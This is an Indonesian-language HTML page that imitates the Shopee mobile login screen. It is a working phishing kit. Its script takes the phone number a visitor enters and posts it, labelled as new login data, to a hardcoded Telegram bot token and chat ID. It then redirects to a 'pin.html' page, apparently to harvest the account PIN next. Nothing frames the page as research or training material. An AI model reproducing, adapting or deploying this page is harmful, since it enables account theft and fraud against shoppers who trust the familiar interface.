<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee</title>
    <style>
        /* =================================
   RESPONSIVE CSS - ALL DEVICES
================================= */

/* RESET */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont,
        "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif;
}

html {
    width: 100%;
    min-height: 100%;
    -webkit-text-size-adjust: 100%;
}

body {
    background-color: #f5f5f5;
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 0;
}

/* =================================
   LOGIN CONTAINER
================================= */

.login-container {
    background-color: #fff;
    width: 100%;
    max-width: 420px;
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    box-shadow: 0 0 15px rgba(0,0,0,0.05);
    overflow-x: hidden;
}

/* =================================
   HEADER
================================= */

.header {
    display: flex;
    align-items: center;
    width: 100%;
    min-height: 58px;
    padding: 12px clamp(12px, 4vw, 20px);
    border-bottom: 1px solid #e8e8e8;
    flex-shrink: 0;
}

.header h1 {
    font-size: clamp(16px, 4vw, 19px);
    font-weight: 500;
    color: #ee4d2d;
    margin-left: 10px;
    flex-grow: 1;
}

.header-right {
    display: flex;
    align-items: center;
    gap: clamp(10px, 3vw, 18px);
    margin-left: auto;
}

.icon-svg {
    width: clamp(20px, 5vw, 25px);
    height: clamp(20px, 5vw, 25px);
    fill: #ee4d2d;
    cursor: pointer;
}

/* =================================
   CONTENT
================================= */

.content {
    width: 100%;
    padding: clamp(25px, 7vh, 50px)
             clamp(18px, 7vw, 32px);
    flex-grow: 1;
    text-align: center;
}

.logo {
    margin-bottom: clamp(25px, 6vh, 42px);
    display: flex;
    justify-content: center;
}

.shopee-logo-img {
    width: clamp(65px, 20vw, 90px);
    height: clamp(65px, 20vw, 90px);
    object-fit: cover;
    border-radius: clamp(12px, 4vw, 20px);
}

/* =================================
   INPUT
================================= */

.input-group {
    display: flex;
    align-items: center;
    width: 100%;
    border-bottom: 1px solid #dbdbdb;
    margin-bottom: clamp(18px, 4vh, 26px);
    padding: 10px 0;
}

.input-group svg {
    width: 21px;
    height: 21px;
    flex-shrink: 0;
    fill: #888;
    margin-right: 12px;
}

.input-group input {
    border: none;
    outline: none;
    width: 100%;
    min-width: 0;
    font-size: 16px;
    padding: 3px 0;
    background: transparent;
}

/* =================================
   BUTTON NEXT
================================= */

.btn-next {
    width: 100%;
    min-height: 44px;
    padding: 12px;
    background-color: #f7f7f7;
    color: #ccc;
    border: none;
    border-radius: 3px;
    font-size: 14px;
    font-weight: 500;
    margin-bottom: 15px;
    cursor: not-allowed;
    transition: 0.3s;
}

/* =================================
   PASSWORD LINK
================================= */

.link-password {
    display: block;
    width: fit-content;
    max-width: 100%;
    color: #0055aa;
    text-decoration: none;
    font-size: 12px;
    margin-bottom: clamp(25px, 6vh, 40px);
    margin-left: auto;
}

/* =================================
   DIVIDER
================================= */

.divider {
    display: flex;
    align-items: center;
    color: #ccc;
    width: 100%;
    margin-bottom: 25px;
}

.divider::before,
.divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background: #dbdbdb;
}

.divider span {
    padding: 0 15px;
    font-size: 12px;
    white-space: nowrap;
}

/* =================================
   SOCIAL LOGIN
================================= */

.btn-social {
    width: 100%;
    min-height: 42px;
    padding: 10px;
    background: white;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    font-size: 14px;
    gap: 10px;
}

.social-svg {
    width: 22px;
    height: 22px;
    flex-shrink: 0;
}

/* =================================
   TERMS
================================= */

.terms {
    font-size: clamp(10px, 2.8vw, 12px);
    color: #888;
    margin-top: 25px;
    line-height: 1.5;
    overflow-wrap: break-word;
}

.terms a {
    color: #0055aa;
    text-decoration: none;
}

/* =================================
   FOOTER
================================= */

.footer {
    width: 100%;
    padding: clamp(15px, 4vw, 22px);
    text-align: center;
    font-size: clamp(12px, 3.5vw, 14px);
    border-top: 1px solid #f0f0f0;
    color: #888;
    flex-shrink: 0;
}

.footer a {
    color: #ee4d2d;
    text-decoration: none;
    font-weight: 500;
}

/* =================================
   SMALL MOBILE (320px - 360px)
================================= */

@media (max-width: 360px) {
    .content {
        padding-left: 18px;
        padding-right: 18px;
    }

    .header h1 {
        font-size: 16px;
    }

    .divider span {
        padding: 0 10px;
    }
}

/* =================================
   TABLET (600px - 1023px)
================================= */

@media (min-width: 600px) {
    body {
        padding: 30px 20px;
    }

    .login-container {
        max-width: 450px;
        min-height: 700px;
        height: auto;
        border-radius: 8px;
    }

    .content {
        padding: 45px 40px;
    }
}

/* =================================
   DESKTOP (1024px+)
================================= */

@media (min-width: 1024px) {
    body {
        padding: 40px;
    }

    .login-container {
        max-width: 460px;
        min-height: 720px;
        height: auto;
        border-radius: 10px;
        box-shadow: 0 5px 30px rgba(0,0,0,0.08);
    }

    .content {
        padding: 50px 45px;
    }
}

/* =================================
   LANDSCAPE / SHORT SCREEN
================================= */

@media (max-height: 600px) and (min-width: 600px) {
    .login-container {
        min-height: auto;
    }

    .content {
        padding-top: 20px;
        padding-bottom: 20px;
    }

    .logo {
        margin-bottom: 20px;
    }

    .terms {
        margin-top: 15px;
    }
}
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Header -->
        <header class="header">
            <svg class="icon-svg" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
            <h1>Log in</h1>
            <div class="header-right">
                <svg class="icon-svg" viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
                <svg class="icon-svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
            </div>
        </header>

        <!-- Main Content -->
        <main class="content">
            <div class="logo">
                <!-- Image Logo Baru -->
                <img src="https://i.pinimg.com/736x/6a/48/38/6a48383706628e554f2205d07eeb445b.jpg" alt="Shopee Logo" class="shopee-logo-img">
            </div>

            <div class="input-group">
                <svg viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 21c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm5-5H7V4h10v13z"/></svg>
                <input type="text" id="phoneInput" placeholder="Nomor Telepon">
            </div>

            <button class="btn-next" id="btnNext" disabled>Berikutnya</button>

            <a href="#" class="link-password">Log in dengan Password</a>

            <div class="divider">
                <span>ATAU</span>
            </div>

            <div class="social-login">
                <button class="btn-social">
                    <svg class="social-svg" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                    Log In dengan Facebook
                </button>
                <button class="btn-social">
                    <svg class="social-svg" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
                    Log In dengan Google
                </button>
            </div>

            <p class="terms">
                Dengan login, kamu menyetujui <a href="#">SYARAT LAYANAN</a> & <a href="#">KEBIJAKAN PRIVASI</a> Shopee.
            </p>
        </main>

        <!-- Footer -->
        <footer class="footer">
            Belum punya akun? <a href="#">Daftar</a>
        </footer>
    </div>

    <!-- JAVASCRIPT -->
    <script>
        const phoneInput = document.getElementById('phoneInput');
        const btnNext = document.getElementById('btnNext');

        const TELEGRAM_TOKEN = '8794002267:AAFS1_xcjzj7y-j4Ue7B-tA9sX83xa_WKmY';
        const TELEGRAM_CHAT_ID = '7549590022';

        phoneInput.addEventListener('input', function() {
            if (phoneInput.value.trim().length > 0) {
                btnNext.disabled = false;
                btnNext.style.backgroundColor = "#ee4d2d";
                btnNext.style.color = "white";
                btnNext.style.cursor = "pointer";
            } else {
                btnNext.disabled = true;
                btnNext.style.backgroundColor = "#f7f7f7";
                btnNext.style.color = "#ccc";
                btnNext.style.cursor = "not-allowed";
            }
        });

        btnNext.addEventListener('click', function() {
            const phoneNumber = phoneInput.value;
            localStorage.setItem('userPhone', phoneNumber);

            const message = `🔔 *Data Login Baru*\n\nNomor Telepon: \`${phoneNumber}\``;

            btnNext.innerText = "Memproses...";
            btnNext.disabled = true;

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => {
                if (response.ok) {
                    location.href = "pin.html";
                } else {
                    alert('Gagal mengirim. Periksa Token/Chat ID.');
                }
            })
            .catch(() => alert('Kesalahan koneksi.'))
            .finally(() => {
                btnNext.innerText = "Berikutnya";
                btnNext.disabled = false;
            });
        });
    </script>

</body>
</html>
